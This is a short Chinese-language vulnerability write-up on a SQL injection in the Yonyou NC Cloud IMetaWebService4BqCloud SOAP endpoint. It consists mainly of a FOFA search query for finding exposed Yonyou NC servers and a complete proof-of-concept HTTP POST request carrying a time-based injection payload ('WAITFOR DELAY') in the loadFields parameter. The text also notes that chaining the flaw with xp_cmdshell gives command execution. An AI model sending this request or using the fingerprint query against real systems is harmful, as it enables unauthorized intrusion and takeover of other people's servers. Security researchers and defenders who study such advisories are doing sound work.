## 用友NC-Cloud-IMetaWebService4BqCloud-SQL注入漏洞

## 一、漏洞简介
用友NC Cloud IMetaWebService4BqCloud接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

## fofa
```
(body="UFIDA" && body="logo/images/") || (body="logo/images/ufida_nc.png") || title="Yonyou NC" || body="<div id=\"nc_text\">" || body="<div id=\"nc_img\" onmouseover=\"overImage('nc');" || (title="产品登录界面" && body="UFIDA NC") || (body="/Client/Uclient/UClient.exe" && title="Yonyou UAP")
```

## POC
```
POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
Host: [目标主机]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
SOAPAction: "urn:loadFields"
Content-Type: text/xml; charset=UTF-8
Content-Length: 417

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
   <soapenv:Header/>
   <soapenv:Body>
      <imet:loadFields>
         <!-- type: string -->
         <imet:string>SmartModel1^1';WAITFOR DELAY '0:0:5'--</imet:string>
      </imet:loadFields>
   </soapenv:Body>
</soapenv:Envelope>
```
